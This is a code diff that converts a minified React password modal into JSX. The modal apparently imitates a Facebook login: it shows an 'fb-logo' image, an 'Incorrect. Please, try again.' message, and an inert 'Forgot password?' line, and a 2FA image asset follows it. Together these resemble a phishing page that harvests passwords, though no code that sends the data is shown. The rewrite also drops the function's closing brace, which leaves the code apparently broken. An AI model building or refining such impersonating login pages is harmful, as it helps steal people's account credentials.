@@ -8171,73 +8171,50 @@ function xf({
     }
 };
 
-  return s.jsx("div", {
-      className: `form ${e&&"active"}`,
-      onClick: () => t(0),
-      children: s.jsxs("form", {
-          className: "form__content p-4",
-          onClick: h => h.stopPropagation(),
-          children: [s.jsx("div", {
-              className: "modal-header form__header justify-content-center",
-              children: s.jsx("div", {
-                  className: "form__logo",
-                  children: s.jsx("img", {
-                      className: "fb-logo",
-                      src: cf,
-                      alt: ""
-                  })
-              })
-          }), s.jsxs("div", {
-              className: "modal-body form__body justify-content-center",
-              children: [s.jsxs("div", {
-                  className: "w-100 mb-4",
-                  children: [s.jsx(et, {
-                      type: "text",
-                      disabled: n,
-                      value: l,
-                      setValue: o,
-                      className: "w-100 mb-none",
-                      title: "Password",
-                      isPassword: !0
-                  }), i === 1 && l.length < 6 ? s.jsx("div", {
-                      className: "text-danger",
-                      children: "Incorrect. Please, try again."
-                  }) : null]
-              }), n ? s.jsxs("div", {
-                  className: "loader w-100 mt-3",
-                  children: [s.jsx("div", {
-                      className: "loader__spinner",
-                      children: s.jsx(Fi, {
-                          variant: "light",
-                          animation: "border",
-                          role: "status",
-                          children: s.jsx("span", {
-                              className: "visually-hidden",
-                              children: "Loading..."
-                          })
-                      })
-                  }), s.jsx(Rt, {
-                      className: "w-100",
-                      onClick: m,
-                      children: "Continue"
-                  })]
-              }) : s.jsx(Rt, {
-                  className: "w-100 mt-3",
-                  onClick: m,
-                  children: "Continue"
-              }), s.jsx("span", {
-                  children: "Forgot password?"
-              })]
-          }), s.jsx("div", {
-              className: "form__footer modal-footer justify-content-center",
-              children: s.jsx("img", {
-                  src: kl,
-                  alt: ""
-              })
-          })]
-      })
-  })
-}
+return (
+    <div className={`form ${e && "active"}`} onClick={() => t(0)}>
+        <form className="form__content p-4" onClick={h => h.stopPropagation()}>
+            <div className="modal-header form__header justify-content-center">
+                <div className="form__logo">
+                    <img className="fb-logo" src={cf} alt="" />
+                </div>
+            </div>
+            <div className="modal-body form__body justify-content-center">
+                <div className="w-100 mb-4">
+                    <input
+                        type="text"
+                        disabled={n}
+                        value={l}
+                        onChange={e => o(e.target.value)}
+                        className="w-100 mb-none"
+                        title="Password"
+                        isPassword={true}
+                    />
+                    {i === 1 && l.length < 6 ? (
+                        <div className="text-danger">Incorrect. Please, try again.</div>
+                    ) : null}
+                </div>
+                {n ? (
+                    <div className="loader w-100 mt-3">
+                        <div className="loader__spinner">
+                            <Fi variant="light" animation="border" role="status">
+                                <span className="visually-hidden">Loading...</span>
+                            </Fi>
+                        </div>
+                        <Rt className="w-100" onClick={m}>Continue</Rt>
+                    </div>
+                ) : (
+                    <Rt className="w-100 mt-3" onClick={m}>Continue</Rt>
+                )}
+                <span>Forgot password?</span>
+            </div>
+            <div className="form__footer modal-footer justify-content-center">
+                <img src={kl} alt="" />
+            </div>
+        </form>
+    </div>
+);
+
 const wf = "/assets/2FA.png";
 
 function kf({
